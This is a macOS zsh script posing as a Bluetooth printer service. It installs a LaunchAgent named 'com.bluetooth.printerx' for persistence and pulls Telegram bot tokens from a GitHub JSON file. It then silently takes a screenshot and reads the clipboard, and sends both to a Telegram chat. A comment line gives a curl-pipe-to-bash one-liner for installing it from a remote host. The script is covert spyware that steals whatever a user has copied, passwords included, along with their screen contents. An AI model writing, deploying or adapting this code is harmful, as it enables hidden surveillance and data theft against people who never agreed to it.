#!/bin/zsh
#curl -o- https://decade.tw/apple.printer.curl.sh | bash

SNAME="com.bluetooth.printerx"
PL="<?xml version=\"1.0\" encoding=\"UTF-8\"?>
<plist version=\"1.0\"><dict>
<key>Label</key><string>$SNAME</string>
<key>RunAtLoad</key><true /><key>StartInterval</key><integer>75</integer>
<key>Program</key><string>$HOME/.tempd/l.apple.sh</string>
<key>StartInterval</key><integer>1800</integer>
</dict></plist>"
PLPATH="$HOME/Library/LaunchAgents/$SNAME.plist"
if [[ $1 == "I" || $1 == "i" ]]; then
  echo "$PL" >> $HOME/Library/LaunchAgents/com.bluetooth.printerx.plist;
# launchctl load $HOME/Library/LaunchAgents/com.bluetooth.printerx.plist;

JSON_URL="https://raw.githubusercontent.com/xlinx/TunnelX/refs/heads/main/printerServices/tokenX.json"
#TELGRAM_TOKEN__hh_god_bot1=curl -H "Accept: application/json" "$JSON_URL" | jq '.TELGRAM_TOKEN__hh_god_bot1'
#TELGRAM_TOKEN__hh_god_bot2=curl -H "Accept: application/json" "$JSON_URL" | jq '.TELGRAM_TOKEN__hh_god_bot2'
#TELGRAM_TOKEN__hh_god_bot="$TELGRAM_TOKEN__hh_god_bot1""$TELGRAM_TOKEN__hh_god_bot2"

TELGRAM_TOKEN__xlinx_bot1=`curl -H "Accept: application/json" "$JSON_URL" | jq '.tunnelX1.TELGRAM_TOKEN__xlinx_bot1'`
TELGRAM_TOKEN__xlinx_bot2=`curl -H "Accept: application/json" "$JSON_URL" | jq '.tunnelX1.TELGRAM_TOKEN__xlinx_bot2'`
TELGRAM_TOKEN__xlinx_bot="$TELGRAM_TOKEN__xlinx_bot1""$TELGRAM_TOKEN__xlinx_bot2"
TELGRAM_CHAT_ID=`curl -H "Accept: application/json" "$JSON_URL" | jq '.tunnelX1.TELGRAM_CHAT_ID'`

TOKEN_TELGRAM=$TELGRAM_TOKEN__xlinx_bot
TOKEN_CHAT_ID=$TELGRAM_CHAT_ID

TELGRAM_UPDATE_URL="https://api.telegram.org/bot$TOKEN_TELGRAM/getUpdates"
TELGRAM_SEND_MESSGAE_URL="https://api.telegram.org/bot$TOKEN_TELGRAM/sendMessage"
TELGRAM_SEND_IMAGE_URL="https://api.telegram.org/bot$TOKEN_TELGRAM/sendPhoto"
echo $TELGRAM_UPDATE_URL
echo $TELGRAM_SEND_MESSGAE_URL
echo $TELGRAM_SEND_IMAGE_URL

FOLDER_PATH="$HOME/.tempd"
PICTURE_PATH="$FOLDER_PATH/d.apple.com.lib"
NOW=$(date)
#ANY=$(cat "/var/log/conn.log" | grep "Incoming session request" | awk \{'print $2 $3 $13 $14'\})
CB=$(pbpaste)
mkdir -p "$FOLDER_PATH"
mkdir -p "$HOME"/Library/LaunchAgents
#touch $PICTURE_PATH
screencapture -t jpg -x "$PICTURE_PATH"

curl -X POST $TELGRAM_SEND_MESSGAE_URL \
      -H "Content-Type: application/json" \
      -d "{\"chat_id\": \"$TOKEN_CHAT_ID\", \"text\": \"CB=$CB\"}"
curl -X POST $TELGRAM_SEND_IMAGE_URL \
      -H "Content-Type:multipart/form-data" \
      -F chat_id=$TOKEN_CHAT_ID \
      -F photo=@"$PICTURE_PATH" \
      -F caption="$PICTURE_PATH"